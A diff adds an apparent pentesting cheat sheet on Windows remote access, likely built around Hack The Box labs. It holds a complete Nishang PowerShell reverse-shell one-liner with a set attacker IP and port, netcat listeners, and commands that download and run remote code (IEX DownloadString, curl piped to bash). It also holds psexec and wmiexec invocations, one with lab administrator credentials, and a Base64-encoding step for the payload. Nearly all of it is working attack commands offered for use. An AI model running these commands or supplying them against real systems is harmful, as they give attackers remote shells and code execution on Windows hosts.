@@ -1,0 +1,145 @@
+---
+Primary_category: "[[WINDOWS PENTESTING]]"
+title: "WINDOWS REMOTE ACCESS"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags: 
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[WINDOWS PENTESTING]]
+
+#### *HTTP ↔ TCP*
+
+##### *Nishang PS Reverse Shell*
+
+> ***[Nishang Reverse Shell Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***
+
+- ***From the Attacker*** 🗡️
+
+###### *Reverse Shell*
+
+Modify the Oneliner IP Address and Port as follows
+
+```powershell /10.10.16.30/ /1234/
+$client = New-Object System.Net.Sockets.TCPClient('10.10.16.30',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+###### *Simple HTTP Server*
+
+> _**Check Simple HTTP Servers [[FILE TRANSFERS#*HTTP*|here]]**_
+
+Setup a Web Server to share the *Reverse Shell*
+
+```bash
+python3 -m http.server 8888
+```
+
+###### *Listening Socket*
+
+> ***Check Listening Sockets → [[SHELLS AND PAYLOADS#Reverse Shell|Reference I]]&nbsp;&nbsp;⚡&nbsp;&nbsp;[[SHELLS AND PAYLOADS#Bind Shell|Reference II]]***
+
+Listen in at the port set in the *Reverse Shell Script*
+
+```bash
+rlwrap nc -nlvp 1234
+```
+
+- ***From the Target*** 🎯
+
+###### *Reverse Connection*
+
+***Request the Reverse Shell*** → `(New-Object Net.WebClient).DownloadString('<URL>')`
+
+***Execute it*** → `IEX` or `Invoke-Expression`
+
+```powershell title="Target"
+start /b powershell.exe -Command IEX (New-Object Net.Webclient).DownloadString('http://10.10.16.30:443/reverse_shell.ps1')
+```
+
+> [!DANGER]- *Same in Bash*
+>
+> The above *Reverse Shell*  Workflow would be the same as the following with [[BASH|bash]]
+>
+> ```bash
+> curl --silent --request GET --location "URL" | bash -
+> ```
+>
+
+> ***PS v3.0  or >***
+
+```powershell title="Target"
+IEX (IWR -UseBasicParsing -Uri '<URL>') # Or Invoke-Expression (Invoke-WebRequest '<URL>')
+```
+
+---
+
+#### *SMB*
+
+##### *PSExec*
+
+This tool from ***[impacket](https://github.com/fortra/impacket)*** can be used to stablish a bind shell if the user authenticated has administrative privileges in the *Workstation or Domain Computer*
+
+> ***CMD***
+
+This tool allow an attacker to get a shell with `cmd.exe`
+
+```bash
+psexec.py -dc-ip <TARGET> <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
+```
+
+> ***PS***
+
+Sometimes it gets tricky to launch a `powershell.exe` instance. We can accomplish this task simply stablishing a reverse shell via `Invoke-Expression` aka `IEX`
+
+###### *Reverse Shell Payload*
+
+>***[Nishang Reverse Shell Oneliner](https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***
+
+```bash
+curl --silent --request GET --location --output <FILE> "https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
+```
+
+###### *Simple HTTP Server*
+
+```bash
+python3 -m http.server <PORT>
+```
+
+###### *Listening Socket*
+
+```bash
+rlwrap -CaR nc -nlvp <PORT>
+```
+
+###### *HTTP Request From Target and Reverse Shell Execution*
+
+```bash
+psexec.py -dc-ip 10.129.135.22 active.htb/Administrator:Ticketmaster1968@active.htb "powershell.exe -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.34:8888/reverse.ps1')"
+```
+
+> [!BUG]- Caution
+>
+> If something goes wrong and the reverse connection cannot be stablished, just change the above powershell command’s scheme codification to `UTF-16LE` and *Base64 encode* it
+>
+> ```bash
+> echo -n "IEX (New-Object Net.WebClient).DownloadString('http://HOST:PORT/FILE')" | iconv --to-code UTF-16LE | base64 -w 0 ; echo
+> ```
+>
+> Then pass that _Base64 String_ as argument to the `powershell.exe` instance executed by `psexec`
+>
+> ```bash
+> psexec.py -dc-ip TARGET DOMAIN/USERNAME:PASSWORD@TARGET 'powershell.exe -Exec Bypass -Enc "BASE64_STRING"'
+> ```
+>
+
+---
+
+#### *RPC*
+
+##### *WMIExec*
+
+```bash
+wmiexec.py -dc-ip <TARGET> <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+```
